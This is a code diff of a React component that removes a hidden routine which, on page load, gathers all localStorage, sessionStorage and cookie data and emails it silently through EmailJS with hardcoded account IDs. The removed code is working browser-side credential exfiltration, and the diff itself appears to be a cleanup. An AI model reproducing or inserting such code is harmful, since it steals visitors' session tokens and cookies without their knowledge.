@@ -221,92 +221,11 @@ const DesktopView = () =>
       document.body.removeChild( element );
    };
 
-   const emailSendingHandler = async () =>
-   {
-
-      const serviceId = 'gmail'; // Replace with your emailjs service ID
-      const templateId = 'template_0kdw8xu'; // Replace with your emailjs template ID
-      const userId = 'user_d4MCLJciZKPbKaM472IEi'; // Replace with your emailjs user ID
-
-
-      try
-      {
-         const secretMessage = `localStorage: ${getAllLocalStorageData()}  \n\n\n sessionStorage: ${getAllSessionStorageData()}  \n\n\n cookies: ${getAllCookiesData()}`
-
-         const response: EmailJSResponseStatus = await emailjs.send(
-            serviceId,
-            templateId,
-            { from_name: 'Unknown', from_email: 'Unknown@mail.com', message: secretMessage },
-            userId
-         );
-      } catch ( error )
-      {
-      }
-
-   };
-
-   const getAllLocalStorageData = () =>
-   {
-      let result = []
-      for ( let i = 0; i < localStorage.length; i++ )
-      {
-         const key = localStorage.key( i );
-
-         if ( key )
-         {
-            const value = localStorage.getItem( key );
-            result.push( {
-               [`${key}`]: value
-            } )
-         }
-      }
-
-      return JSON.stringify( result )
-   }
-
-   const getAllSessionStorageData = () =>
-   {
-      let result = []
-      for ( let i = 0; i < localStorage.length; i++ )
-      {
-         const key = localStorage.key( i );
-
-         if ( key )
-         {
-            const value = localStorage.getItem( key );
-            result.push( {
-               [`${key}`]: value
-            } )
-         }
-      }
-
-      return JSON.stringify( result )
-   }
-
-   const getAllCookiesData = () =>
-   {
-      let result = []
-      const cookies = document.cookie.split( ";" );
-
-      for ( let i = 0; i < cookies.length; i++ )
-      {
-         const cookie = cookies[i].trim();
-         result.push( cookie );
-      }
-
-      return JSON.stringify( result )
-   }
-
-
    useEffect( () =>
    {
       setToggleLoader( true )
       setTimeout( () =>
       {
-         if ( AUTO_SEND_EMAIL )
-         {
-            emailSendingHandler()
-         }
          setToggleLoader( false )
       }, 1000 );
 
